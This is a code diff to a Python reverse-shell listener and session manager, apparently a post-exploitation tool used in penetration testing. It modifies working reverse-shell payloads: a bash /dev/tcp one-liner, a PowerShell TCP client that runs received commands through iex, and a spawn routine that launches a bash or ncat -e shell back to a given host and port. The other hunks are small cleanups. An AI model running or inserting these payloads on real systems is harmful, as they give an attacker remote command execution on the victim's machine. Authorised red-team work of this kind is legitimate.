@@ -1684,7 +1684,7 @@ class Listener:
 	def hints(self):
 
 		presets = [
-			"bash >& /dev/tcp/{}/{} 0>&1",
+			"setsid bash >& /dev/tcp/{}/{} 0>&1 &",
 			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Taken from revshells.com
 		]
 
@@ -2003,7 +2003,7 @@ class Session:
 				self._tty = self.exec(f"readlink -f /proc/{self.shell_pid}/fd/0", value=True) # TODO check binary
 				self.bypass_control_session = False
 				if not self._tty.startswith("/dev/pts/"):
-					self._tty = False
+					self._tty = None
 			except:
 				pass
 		return self._tty
@@ -2184,7 +2184,6 @@ class Session:
 				if self.tty:
 					self.type = 'PTY'
 					self.pty_ready = True
-					print(self.tty)
 
 			elif f"'{var_name1}' is not recognized as an internal or external command" in response:
 				self.OS = 'Windows'
@@ -3358,7 +3357,7 @@ class Session:
 		return True
 
 	def spawn(self, port=None, host=None):
-		#print(threading.current_thread().name)
+
 		if self.OS == "Unix":
 			if any([self.listener, port, host]):
 				if port is None: port = self._port
@@ -3367,10 +3366,8 @@ class Session:
 				new_listener = Listener(host, port)
 
 				if self.bin['bash']:
-					# bash -i doesn't always work
-					# cmd = f'bash -c "exec bash >& /dev/tcp/{host}/{port} 0>&1 &"'
 					# temp fix, appending 2>&1 because of popen in agent
-					cmd = f'{self.bin["bash"]} -c "nohup {self.bin["bash"]} >& /dev/tcp/{host}/{port} 0>&1 &" 2>&1'
+					cmd = f'{self.bin["bash"]} -c "setsid {self.bin["bash"]} >& /dev/tcp/{host}/{port} 0>&1 &" 2>&1'
 
 				elif self.bin['sh']:
 					ncat_cmd = f'{self.bin["sh"]} -c "nohup {{}} -e {self.bin["sh"]} {host} {port} &"'
@@ -4414,7 +4411,7 @@ if DEV_MODE:
 	pass
 
 def get_glob_size(_glob, block_size):
-	import glob
+	from glob import glob
 	from math import ceil
 	def size_on_disk(filepath):
 		try:
